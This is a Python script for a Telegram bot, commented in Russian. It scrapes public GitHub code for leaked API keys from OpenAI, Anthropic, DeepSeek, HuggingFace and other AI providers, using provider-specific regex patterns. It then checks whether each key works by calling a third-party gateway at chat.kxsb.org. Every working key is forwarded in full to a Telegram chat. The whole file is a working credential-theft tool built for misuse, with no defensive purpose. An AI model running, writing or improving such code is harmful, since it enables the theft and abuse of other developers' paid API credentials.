import os
import re
import sys
import time
import requests
import logging
import asyncio

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ─── настройки ─────────────────────────────────────────────────────────────
logging.basicConfig(format="%(asctime)s - %(message)s", level=logging.INFO, stream=sys.stdout)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Эндпоинт, который мы проверяем (твой кастомный шлюз)
BASE_URL = "https://chat.kxsb.org/api/v1"
# Дефолтная модель, если каталог не отдастся
FALLBACK_MODEL = "azure-5k/deepseek-v4.1-flash"

# ─── регулярки для всех провайдеров ────────────────────────────────────────
KEY_PATTERNS = [
    {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
    {"provider": "kimi",        "regex": re.compile(r"\bsk-kimi-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "minimax",     "regex": re.compile(r"\bsk-cp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "qwen",        "regex": re.compile(r"\bsk-sp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "deepseek",    "regex": re.compile(r"\bsk-[a-f0-9]{32}\b")},
    {"provider": "zhipu",       "regex": re.compile(r"\b[a-f0-9]{32}\.[A-Za-z0-9]{16}\b")},
    {"provider": "huggingface", "regex": re.compile(r"\bhf_[A-Za-z]{34}\b")},
    # Универсальный (мин. 32 символа, есть цифры и буквы)
    {"provider": "generic-sk",  "regex": re.compile(r"\bsk-(?=[A-Za-z0-9_-]*\d)(?=[A-Za-z0-9_-]*[A-Z])(?=[A-Za-z0-9_-]*[a-z])[A-Za-z0-9_-]{32,}\b")},
]

def identify_key(token):
    for p in KEY_PATTERNS:
        if p["regex"].fullmatch(token):
            return p["provider"]
    return None

# ─── поиск на GitHub ───────────────────────────────────────────────────────
def fetch_github_keys():
    logger.info("🔎 Начинаю поиск ключей на GitHub...")
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
    query = "sk- OR hf_ language:Python OR language:JavaScript"
    
    try:
        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 30}, timeout=15)
        if resp.status_code == 403:
            logger.error("❌ ОШИБКА 403: Токен не подходит для Code Search. Создай Classic Token с галочкой public_repo!")
            return {}
        resp.raise_for_status()
        
        items = resp.json().get("items", [])
        logger.info(f"✅ Найдено файлов: {len(items)}")
        
        found_keys = {}
        for item in items[:20]: # Берем 20 файлов за проход
            repo = item["repository"]["full_name"]
            path = item["path"]
            file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=10)
            
            if file_resp.status_code == 200:
                text = file_resp.text
                for p in KEY_PATTERNS:
                    for match in p["regex"].finditer(text):
                        token = match.group(0)
                        if token not in found_keys:
                            found_keys[token] = {"provider": p["provider"], "repo": repo}
            time.sleep(1) # Пауза чтобы не словить лимит
            
        logger.info(f"🔑 Извлечено уникальных ключей: {len(found_keys)}")
        return found_keys
    except Exception as e:
        logger.error(f"❌ Ошибка поиска: {e}")
        return {}

# ─── проверка ключей и проб моделей ────────────────────────────────────────
def check_key(api_key):
    try:
        resp = requests.get(f"{BASE_URL}/models", headers={"Authorization": f"Bearer {api_key}"}, timeout=10)
        if resp.status_code == 200:
            return [m.get("id", "") for m in resp.json().get("data", [])]
    except:
        pass
    return []

def probe_models(api_key, models):
    results = []
    # Берем максимум 7 моделей
    for model in models[:7]:
        payload = {"model": model, "messages": [{"role": "user", "content": "ping"}], "max_tokens": 5}
        start = time.perf_counter()
        try:
            resp = requests.post(f"{BASE_URL}/chat/completions", headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}, json=payload, timeout=10)
            latency = round(time.perf_counter() - start, 2)
            ok = resp.status_code == 200
            msg = resp.text[:80].replace("\n", " ").strip() if not ok else "OK"
        except Exception as e:
            ok, latency, msg = False, "?", str(e)
        results.append({"model": model, "ok": ok, "status": getattr(resp, 'status_code', 'ERR'), "latency": latency, "msg": msg})
    return results

# ─── формирование отчета ───────────────────────────────────────────────────
def format_report(key, provider, models, probes):
    lines = [
        "⚡️ Фаст-скан",
        f"🌐 Endpoint: {BASE_URL}",
        f"🔑 `{key}`",
        f"🏷 Провайдер: {provider}",
        ""
    ]
    working = [p for p in probes if p["ok"]]
    if working:
        lines.append("🏆 ✅ working")
        lines.append(f"💬 {working[0]['model']}: OK ({working[0]['latency']}s)")
    else:
        lines.append("🏆 ❌ dead (все пробы отклонены)")
    
    lines.append("\n🧪 Пробы · " + str(len(probes)) + ":")
    for p in probes:
        icon = "✅" if p["ok"] else ("❓" if p["status"] == 403 else "❌")
        err = f" · 💬 {p['msg']}" if not p["ok"] and len(p["msg"]) > 3 else ""
        lines.append(f"{p['model']} → {p['status']} {icon} {p['latency']}s{err}")
    
    if models:
        lines.append(f"\n📚 Каталог · {len(models)}:")
        for m in models[:5]:
            lines.append(m)
        if len(models) > 5:
            lines.append(f"… и ещё {len(models) - 5}")
            
    lines.append("\n💾 Записано в историю")
    return "\n".join(lines)

# ─── главный цикл ──────────────────────────────────────────────────────────
async def run_scan():
    found = fetch_github_keys()
    if not found:
        logger.info("🤷 Ключей не найдено. Завершаю.")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    for key, meta in found.items():
        logger.info(f"Проверяю {key[:10]}... ({meta['provider']})")
        
        # 1. Проверяем доступ к /models
        models = check_key(key)
        if not models:
            logger.info("   └ Мертвый (нет доступа к /models)")
            continue
            
        logger.info(f"   └ Доступно моделей: {len(models)}. Делаю пробы...")
        
        # 2. Делаем пробы моделей
        probes = probe_models(key, models)
        
        # 3. Если есть хотя бы одна рабочая - отправляем
        if any(p["ok"] for p in probes):
            report = format_report(key, meta["provider"], models, probes)
            if CHAT_ID:
                await app.bot.send_message(chat_id=CHAT_ID, text=report, parse_mode="Markdown")
            logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
        else:
            logger.info("   └ Мертвый (все пробы 401/403)")

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Бот работает. Ищу ключи в фоне.")

if __name__ == "__main__":
    if not BOT_TOKEN or not GITHUB_TOKEN:
        logger.error("Нет токенов в переменных окружения!")
        sys.exit(1)
    
    asyncio.run(run_scan())
    logger.info("✅ Сессия завершена.")
